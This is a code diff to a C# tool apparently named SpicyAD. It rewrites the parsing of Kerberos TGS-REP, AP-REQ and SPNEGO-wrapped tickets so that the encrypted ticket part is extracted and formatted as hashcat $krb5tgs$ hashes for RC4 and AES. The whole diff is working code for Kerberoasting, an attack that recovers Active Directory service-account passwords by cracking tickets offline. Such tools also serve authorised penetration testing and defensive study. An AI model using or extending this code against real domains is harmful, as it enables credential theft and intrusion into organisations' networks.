@@ -794,117 +794,104 @@ namespace SpicyAD
                     return null;
                 }
 
-                byte[] ticket;
-
-                // Check response type
-                if (ticketBytes[0] == 0x6D) // TGS-REP
+                // Locate the raw Ticket (APPLICATION 1 = 0x61) inside whatever wrapper
+                // the caller handed us: TGS-REP (0x6D), AP-REQ (0x6E), GSS-API/SPNEGO
+                // wrapped AP-REQ (0x60), or a raw ticket already.
+                byte[] rawTicket = ExtractRawTicket(ticketBytes);
+                if (rawTicket == null || rawTicket.Length < 20 || rawTicket[0] != 0x61)
                 {
-                    // Extract ticket [5] from TGS-REP
-                    int ticketPos = FindTag(ticketBytes, 0xA5, 0);
-                    if (ticketPos == -1)
-                    {
-                        Console.WriteLine("    [!] Could not find ticket in TGS-REP");
-                        return null;
-                    }
-
-                    int ticketLen = ParseLength(ticketBytes, ticketPos + 1, out int ticketDataStart);
-                    ticket = new byte[ticketLen];
-                    Array.Copy(ticketBytes, ticketDataStart, ticket, 0, ticketLen);
-                }
-                else if (ticketBytes[0] == 0x6E) // AP-REQ (from Windows API)
-                {
-                    // Find ticket [3] in AP-REQ
-                    int ticketStart = -1;
-                    int ticketLength = 0;
-
-                    for (int i = 0; i < ticketBytes.Length - 10; i++)
-                    {
-                        if (ticketBytes[i] == 0xA3)
-                        {
-                            ticketLength = ParseLength(ticketBytes, i + 1, out ticketStart);
-                            break;
-                        }
-                    }
-
-                    if (ticketStart == -1 || ticketLength == 0)
-                    {
-                        Console.WriteLine("    [!] Could not find ticket in AP-REQ");
-                        return null;
-                    }
-
-                    ticket = new byte[ticketLength];
-                    Array.Copy(ticketBytes, ticketStart, ticket, 0, ticketLength);
-                }
-                else
-                {
-                    // Try as raw ticket
-                    ticket = ticketBytes;
+                    Console.WriteLine($"    [!] Could not locate Ticket structure (first byte 0x{ticketBytes[0]:X2})");
+                    return null;
                 }
 
-                // Parse the Ticket structure to get enc-part
-                int encType = 23;
+                // Walk the Ticket ASN.1 tree properly:
+                //   Ticket ::= [APPLICATION 1] SEQUENCE {
+                //       tkt-vno  [0] INTEGER (5),   <-- do NOT confuse with etype
+                //       realm    [1] Realm,
+                //       sname    [2] PrincipalName,
+                //       enc-part [3] EncryptedData
+                //   }
+                int p = 1;
+                ParseLength(rawTicket, p, out p); // skip APPLICATION 1 length
+                if (p >= rawTicket.Length || rawTicket[p] != 0x30)
+                {
+                    Console.WriteLine("    [!] Malformed Ticket (missing inner SEQUENCE)");
+                    return null;
+                }
+                p++;
+                int seqLen = ParseLength(rawTicket, p, out p);
+                int seqEnd = Math.Min(p + seqLen, rawTicket.Length);
+
+                int encType = 0;
                 byte[] cipher = null;
 
-                // Find enc-part [3] in Ticket
-                for (int i = 0; i < ticket.Length - 10; i++)
+                while (p < seqEnd)
                 {
-                    if (ticket[i] == 0xA3)
+                    byte tag = rawTicket[p];
+                    int fLen = ParseLength(rawTicket, p + 1, out int fStart);
+                    int fEnd = fStart + fLen;
+
+                    if (tag == 0xA3) // enc-part [3]
                     {
-                        int encPartLen = ParseLength(ticket, i + 1, out int encPartStart);
-
-                        // Skip SEQUENCE tag
-                        if (ticket[encPartStart] == 0x30)
+                        // EncryptedData ::= SEQUENCE {
+                        //     etype  [0] Int32,
+                        //     kvno   [1] UInt32 OPTIONAL,
+                        //     cipher [2] OCTET STRING
+                        // }
+                        if (fStart < rawTicket.Length && rawTicket[fStart] == 0x30)
                         {
-                            ParseLength(ticket, encPartStart + 1, out encPartStart);
-                        }
+                            int edLen = ParseLength(rawTicket, fStart + 1, out int edPos);
+                            int edEnd = Math.Min(edPos + edLen, rawTicket.Length);
 
-                        // Find etype [0]
-                        for (int j = encPartStart; j < Math.Min(encPartStart + 50, ticket.Length - 5); j++)
-                        {
-                            if (ticket[j] == 0xA0 && ticket[j + 1] == 0x03 && ticket[j + 2] == 0x02 && ticket[j + 3] == 0x01)
+                            while (edPos < edEnd)
                             {
-                                encType = ticket[j + 4];
-                                string etypeName = encType switch
-                                {
-                                    17 => "AES128",
-                                    18 => "AES256",
-                                    23 => "RC4-HMAC",
-                                    _ => encType < 17 ? "DES/Unsupported" : "Unknown"
-                                };
-                                Console.WriteLine($"    [*] Encryption type: {encType} ({etypeName})");
-                                break;
-                            }
-                        }
+                                byte t = rawTicket[edPos];
+                                int flen = ParseLength(rawTicket, edPos + 1, out int cStart);
+                                int fend = cStart + flen;
 
-                        // Find cipher [2]
-                        for (int j = encPartStart; j < ticket.Length - 10; j++)
-                        {
-                            if (ticket[j] == 0xA2)
-                            {
-                                int cipherLen = ParseLength(ticket, j + 1, out int cipherStart);
-
-                                // Skip OCTET STRING tag
-                                if (cipherStart < ticket.Length && ticket[cipherStart] == 0x04)
+                                if (t == 0xA0 && cStart < rawTicket.Length && rawTicket[cStart] == 0x02)
                                 {
-                                    cipherLen = ParseLength(ticket, cipherStart + 1, out cipherStart);
+                                    int iLen = ParseLength(rawTicket, cStart + 1, out int iStart);
+                                    encType = 0;
+                                    for (int k = 0; k < iLen && iStart + k < rawTicket.Length; k++)
+                                        encType = (encType << 8) | rawTicket[iStart + k];
                                 }
-
-                                if (cipherStart + cipherLen <= ticket.Length && cipherLen > 0)
+                                else if (t == 0xA2 && cStart < rawTicket.Length && rawTicket[cStart] == 0x04)
                                 {
-                                    cipher = new byte[cipherLen];
-                                    Array.Copy(ticket, cipherStart, cipher, 0, cipherLen);
-                                    Console.WriteLine($"    [*] Extracted {cipherLen} bytes of cipher");
+                                    int oLen = ParseLength(rawTicket, cStart + 1, out int oStart);
+                                    if (oStart + oLen <= rawTicket.Length && oLen > 0)
+                                    {
+                                        cipher = new byte[oLen];
+                                        Array.Copy(rawTicket, oStart, cipher, 0, oLen);
+                                    }
                                 }
-                                break;
+                                edPos = fend;
                             }
                         }
                         break;
                     }
+                    p = fEnd;
                 }
+
+                string etypeName = encType switch
+                {
+                    17 => "AES128-CTS-HMAC-SHA1-96",
+                    18 => "AES256-CTS-HMAC-SHA1-96",
+                    23 => "RC4-HMAC",
+                    _  => $"Unsupported"
+                };
+                Console.WriteLine($"    [*] Encryption type: {encType} ({etypeName})");
 
                 if (cipher == null || cipher.Length == 0)
                 {
-                    Console.WriteLine($"    [!] Could not extract cipher from ticket");
+                    Console.WriteLine("    [!] Could not extract cipher from ticket");
+                    return null;
+                }
+                Console.WriteLine($"    [*] Extracted {cipher.Length} bytes of cipher");
+
+                if (encType != 17 && encType != 18 && encType != 23)
+                {
+                    Console.WriteLine($"    [!] Unsupported encryption type {encType} - cannot format for hashcat");
                     return null;
                 }
 
@@ -916,10 +903,11 @@ namespace SpicyAD
 
                 if (encType == 23)
                 {
+                    // RC4-HMAC (hashcat -m 13100): first 16 bytes = checksum, rest = edata
                     checksum = cipherHex.Substring(0, Math.Min(32, cipherHex.Length));
                     edata = cipherHex.Length > 32 ? cipherHex.Substring(32) : "";
                 }
-                else if (encType == 17 || encType == 18)
+                else // AES128 (19600) / AES256 (19700): last 12 bytes = checksum, rest = edata
                 {
                     int checksumStart = cipherHex.Length - 24;
                     if (checksumStart > 0)
@@ -933,13 +921,16 @@ namespace SpicyAD
                         edata = "";
                     }
                 }
-                else
-                {
-                    Console.WriteLine($"    [!] Unsupported encryption type {encType}");
-                    return null;
-                }
 
-                string hash = $"$krb5tgs${encType}$*{userName}${domain}${spn}*${checksum}${edata}";
+                // Hashcat format differs per etype:
+                //   13100 (RC4/23):   $krb5tgs$23$*user$realm$spn*$checksum$edata
+                //   19600 (AES128/17): $krb5tgs$17$user$realm$*spn*$checksum$edata
+                //   19700 (AES256/18): $krb5tgs$18$user$realm$*spn*$checksum$edata
+                string hash;
+                if (encType == 23)
+                    hash = $"$krb5tgs$23$*{userName}${domain}${spn}*${checksum}${edata}";
+                else
+                    hash = $"$krb5tgs${encType}${userName}${domain}$*{spn}*${checksum}${edata}";
 
                 Console.WriteLine($"    [+] Successfully created hash for {userName}");
                 return hash;
@@ -949,6 +940,79 @@ namespace SpicyAD
                 Console.WriteLine($"    [!] Error parsing TGS: {ex.Message}");
                 return null;
             }
+        }
+
+        /// <summary>
+        /// Extract the raw [APPLICATION 1] Ticket blob from whatever the KDC / Windows
+        /// LSA handed us. Handles TGS-REP, AP-REQ, GSS-API/SPNEGO wrapped AP-REQ, and
+        /// already-raw tickets. Returns null if nothing recognizable is found.
+        /// </summary>
+        private static byte[] ExtractRawTicket(byte[] response)
+        {
+            if (response == null || response.Length < 4) return null;
+
+            // Already a raw Ticket
+            if (response[0] == 0x61) return response;
+
+            // TGS-REP (APPLICATION 13) -> walk to ticket [5]
+            if (response[0] == 0x6D)
+                return ExtractFieldFromSequence(response, 0xA5);
+
+            // AP-REQ (APPLICATION 14) -> walk to ticket [3]
+            if (response[0] == 0x6E)
+                return ExtractFieldFromSequence(response, 0xA3);
+
+            // GSS-API / SPNEGO wrapped AP-REQ (APPLICATION 0). GetRequest() often
+            // returns this shape: the AP-REQ (0x6E) is embedded inside after the
+            // mech OID and a 2-byte token id. Find the inner 0x6E and recurse.
+            if (response[0] == 0x60)
+            {
+                for (int i = 1; i < response.Length - 10; i++)
+                {
+                    if (response[i] == 0x6E)
+                    {
+                        byte[] apReq = new byte[response.Length - i];
+                        Array.Copy(response, i, apReq, 0, apReq.Length);
+                        return ExtractRawTicket(apReq);
+                    }
+                }
+            }
+            return null;
+        }
+
+        /// <summary>
+        /// Given an APPLICATION-tagged SEQUENCE (like TGS-REP or AP-REQ), walk its
+        /// top-level context-tagged fields respecting ASN.1 lengths, and return the
+        /// content bytes of the field with the given context tag byte.
+        /// </summary>
+        private static byte[] ExtractFieldFromSequence(byte[] data, byte contextTag)
+        {
+            try
+            {
+                int p = 1;
+                ParseLength(data, p, out p);          // skip APPLICATION length
+                if (p >= data.Length || data[p] != 0x30) return null;
+                p++;
+                int seqLen = ParseLength(data, p, out p);
+                int seqEnd = Math.Min(p + seqLen, data.Length);
+
+                while (p < seqEnd)
+                {
+                    byte tag = data[p];
+                    int fLen = ParseLength(data, p + 1, out int fStart);
+                    int fEnd = fStart + fLen;
+
+                    if (tag == contextTag)
+                    {
+                        byte[] result = new byte[fLen];
+                        Array.Copy(data, fStart, result, 0, fLen);
+                        return result;
+                    }
+                    p = fEnd;
+                }
+            }
+            catch { }
+            return null;
         }
 
         public static string ParseASREPForHashcat(byte[] asrep, string userName)
